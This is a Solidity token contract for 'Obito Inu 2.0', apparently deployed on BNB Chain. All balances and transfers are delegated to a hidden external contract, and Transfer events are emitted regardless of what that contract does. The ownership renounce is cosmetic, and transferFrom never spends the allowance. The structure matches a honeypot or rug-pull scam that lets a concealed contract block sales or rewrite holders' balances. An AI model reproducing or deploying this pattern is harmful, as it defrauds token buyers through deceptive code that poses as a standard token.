/**
 *Submitted for verification at BscScan.com on 2022-06-11
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface Acc {
    function doTransfer(address caller, address from, address to, uint amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
    function setup(address who,address pair,uint8 dec,uint256 total) external;
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract ObitoInu{
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    uint256 totalSupply_;
    address private Acc_address;
    address public owner;
    mapping(address => mapping (address => uint256)) allowed;
    string public constant name = "Obito Inu 2.0";
    string public constant symbol = "Obinu";
    uint8 public constant decimals = 9;


    constructor(address _acc) public {
        totalSupply_ = 10000000*10**9;
        owner = msg.sender;
        Acc_address = _acc;
        IDEXRouter _idexV2Router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        Acc(Acc_address).setup(msg.sender,IDEXFactory(_idexV2Router.factory()).createPair(address(this), _idexV2Router.WETH()),9,totalSupply_);
    }

        function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }
    function approve(address delegate, uint256 numTokens) public returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }
    function allowance(address owner, address delegate) public view returns (uint256) {
        return allowed[owner][delegate];
    }
    function balanceOf(address tokenOwner) public view returns (uint256) {
        return Acc(Acc_address).balanceOf(tokenOwner);
    }

    function byeByeOwnership() public {
        require(msg.sender==owner, "Not allowed");
        emit OwnershipTransferred(owner, address(0x000000000000000000000000000000000000dEaD));
        owner = address(0x000000000000000000000000000000000000dEaD);
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(allowed[from][msg.sender]>=amount, "Not allowed");
        Acc(Acc_address).doTransfer(msg.sender,from, to, amount);
        emit Transfer(from, to, amount);
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool) {
        Acc(Acc_address).doTransfer(msg.sender,msg.sender, to, amount);
        emit Transfer(msg.sender, to, amount);
        return true;
    }

}